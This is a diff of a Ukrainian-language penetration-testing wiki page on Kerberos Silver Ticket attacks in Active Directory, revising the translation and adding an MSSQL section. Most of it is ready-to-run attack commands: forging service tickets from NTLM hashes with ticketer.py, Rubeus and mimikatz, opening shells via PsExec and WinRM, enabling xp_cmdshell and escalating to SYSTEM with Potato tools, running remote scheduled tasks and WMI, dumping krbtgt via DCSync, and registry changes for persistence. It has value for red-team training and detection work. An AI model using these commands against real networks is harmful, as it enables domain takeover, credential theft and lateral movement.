@@ -6,13 +6,13 @@
 
 ## Silver ticket
 
-Атака **Silver Ticket** передбачає експлуатацію сервісних квитків в середовищах Active Directory (AD). Цей метод базується на **отриманні NTLM хешу облікового запису сервісу**, такого як обліковий запис комп'ютера, для підробки квитка служби надання квитків (TGS). З цим підробленим квитком зловмисник може отримати доступ до конкретних сервісів в мережі, **вдаючи з себе будь-якого користувача**, зазвичай намагаючись отримати адміністративні привілеї. Підкреслюється, що використання AES ключів для підробки квитків є більш безпечним і менш помітним.
+Атака **Silver Ticket** передбачає експлуатацію service tickets в середовищах Active Directory (AD). Цей метод базується на **acquiring the NTLM hash of a service account**, наприклад computer account, для підробки Ticket Granting Service (TGS) ticket. З таким підробленим квитком атакуючий може отримати доступ до конкретних сервісів у мережі, **impersonating any user**, зазвичай прагнучи отримати адміністративні привілеї. Підкреслюється, що використання AES keys для підробки квитків є більш безпечним і менш помітним.
 
 > [!WARNING]
-> Silver Tickets менш помітні, ніж Golden Tickets, оскільки вони вимагають лише **хеш облікового запису сервісу**, а не облікового запису krbtgt. Однак вони обмежені конкретним сервісом, на який націлені. Більше того, просто вкрасти пароль користувача.
-Більше того, якщо ви зкомпрометуєте **пароль облікового запису з SPN**, ви можете використовувати цей пароль для створення Silver Ticket, вдаючи з себе будь-якого користувача для цього сервісу.
+> Silver Tickets менш помітні, ніж Golden Tickets, оскільки вони потребують лише **hash of the service account**, а не krbtgt account. Однак вони обмежені конкретним сервісом, на який спрямовані. Крім того, достатньо просто вкрасти пароль користувача.
+> Якщо ви скомпрометували **account's password with a SPN**, ви можете використати цей пароль для створення Silver Ticket, що impersonating any user до цього сервісу.
 
-Для створення квитків використовуються різні інструменти в залежності від операційної системи:
+Для створення квитків (ticket crafting) використовуються різні інструменти залежно від операційної системи:
 
 ### On Linux
 ```bash
@@ -20,7 +20,7 @@ python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-### На Windows
+### У Windows
 ```bash
 # Using Rubeus
 ## /ldap option is used to get domain data automatically
@@ -37,48 +37,81 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS-сервіс виділяється як загальна ціль для доступу до файлової системи жертви, але інші сервіси, такі як HOST і RPCSS, також можуть бути використані для завдань і запитів WMI.
+Сервіс CIFS підкреслюється як поширена ціль для доступу до файлової системи жертви, але інші сервіси, такі як HOST і RPCSS, також можна експлуатувати для виконання завдань та WMI-запитів.
+
+### Приклад: MSSQL service (MSSQLSvc) + Potato to SYSTEM
+
+Якщо у вас є NTLM-хеш (або AES-ключ) облікового запису сервісу SQL (наприклад, sqlsvc), ви можете підробити TGS для MSSQL SPN і impersonate будь-якого користувача для SQL service. Далі увімкніть xp_cmdshell, щоб виконувати команди від імені облікового запису сервісу SQL. Якщо цей токен має SeImpersonatePrivilege, використайте Potato для ескалації до SYSTEM.
+```bash
+# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
+python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+-spn MSSQLSvc/<host.fqdn>:1433 administrator
+export KRB5CCNAME=$PWD/administrator.ccache
+
+# Connect to SQL using Kerberos and run commands via xp_cmdshell
+impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
+-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
+```
+- Якщо отриманий контекст має SeImpersonatePrivilege (зазвичай для service accounts), використайте варіант Potato, щоб отримати SYSTEM:
+```bash
+# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
+PrintSpoofer.exe -c "cmd /c whoami"
+# or
+GodPotato -cmd "cmd /c whoami"
+```
+Детальніше про зловживання MSSQL та увімкнення xp_cmdshell:
+
+{{#ref}}
+abusing-ad-mssql.md
+{{#endref}}
+
+Огляд Potato techniques:
+
+{{#ref}}
+../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
+{{#endref}}
 
 ## Доступні сервіси
 
-| Тип сервісу                                | Сервісні срібні квитки                                                    |
+| Service Type                               | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>В залежності від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>В деяких випадках ви можете просто запитати: WINRM</p> |
-| Заплановані завдання                       | HOST                                                                       |
-| Спільний доступ до файлів Windows, також psexec | CIFS                                                                       |
-| Операції LDAP, включаючи DCSync           | LDAP                                                                       |
-| Інструменти адміністрування віддалених серверів Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Золоті квитки                              | krbtgt                                                                     |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
+| Scheduled Tasks                            | HOST                                                                       |
+| Windows File Share, also psexec            | CIFS                                                                       |
+| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Golden Tickets                             | krbtgt                                                                     |
 
-Використовуючи **Rubeus**, ви можете **запитати всі** ці квитки, використовуючи параметр:
+Використовуючи **Rubeus**, ви можете **запитати всі** ці квитки, використавши параметр:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Ідентифікатори подій срібних квитків
+### Silver tickets — Ідентифікатори подій
 
-- 4624: Вхід облікового запису
-- 4634: Вихід облікового запису
-- 4672: Вхід адміністратора
+- 4624: Успішний вхід облікового запису
+- 4634: Вихід з облікового запису
+- 4672: Адміністраторський вхід
 
-## Постійність
+## Персистентність
 
-Щоб уникнути зміни паролів на машинах кожні 30 днів, встановіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або ви можете встановити `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` на більше значення, ніж 30 днів, щоб вказати період ротації, коли пароль машини має бути змінений.
+Щоб уникнути того, щоб машини змінювали пароль кожні 30 днів, встановіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або можна встановити `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` на значення більше ніж 30days, щоб вказати період ротації, коли пароль машини має бути змінений.
 
 ## Зловживання сервісними квитками
 
-У наступних прикладах уявімо, що квиток отримано, імплементуючи обліковий запис адміністратора.
+У наведених прикладах уявімо, що квиток отримано шляхом імітації облікового запису адміністратора.
 
 ### CIFS
 
-З цим квитком ви зможете отримати доступ до папок `C$` і `ADMIN$` через **SMB** (якщо вони відкриті) і копіювати файли до частини віддаленої файлової системи, просто зробивши щось на зразок:
+З цим квитком ви зможете отримати доступ до папок `C$` та `ADMIN$` через **SMB** (якщо вони відкриті) та скопіювати файли в частину віддаленої файлової системи, просто зробивши щось на кшталт:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Ви також зможете отримати оболонку всередині хоста або виконати довільні команди, використовуючи **psexec**:
+Ви також зможете отримати shell усередині host або виконувати довільні команди за допомогою **psexec**:
+
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -86,7 +119,7 @@ copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 
 ### HOST
 
-З цією дозволом ви можете створювати заплановані завдання на віддалених комп'ютерах і виконувати довільні команди:
+З цим дозволом ви можете створювати заплановані завдання на віддалених комп'ютерах і виконувати довільні команди:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -100,7 +133,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-З цими квитками ви можете **виконати WMI в системі жертви**:
+За допомогою цих квитків ви можете **виконувати WMI у системі жертви**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -110,30 +143,32 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Знайдіть **додаткову інформацію про wmiexec** на наступній сторінці:
+Знайдіть **більше інформації про wmiexec** на наступній сторінці:
+
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
 {{#endref}}
 
-### HOST + WSMAN (WINRM)
+### ХОСТ + WSMAN (WINRM)
 
-З доступом winrm до комп'ютера ви можете **отримати доступ** до нього і навіть отримати PowerShell:
+Маючи доступ по winrm до комп'ютера, ви можете **підключитися до нього** та навіть отримати PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Перевірте наступну сторінку, щоб дізнатися **більше способів підключення до віддаленого хоста за допомогою winrm**:
+Перегляньте наступну сторінку, щоб дізнатися **більше способів підключення до віддаленого хоста за допомогою winrm**:
+
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Зверніть увагу, що **winrm має бути активним і слухати** на віддаленому комп'ютері для доступу до нього.
+> Зверніть увагу, що **winrm має бути активним і прослуховувати** на віддаленому комп'ютері, щоб отримати до нього доступ.
 
 ### LDAP
 
-З цією привілеєю ви можете скинути базу даних DC, використовуючи **DCSync**:
+Маючи це право, ви можете отримати дамп бази даних DC за допомогою **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
@@ -145,11 +180,12 @@ dcsync.md
 {{#endref}}
 
 
-## Посилання
+## Джерела
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 
 
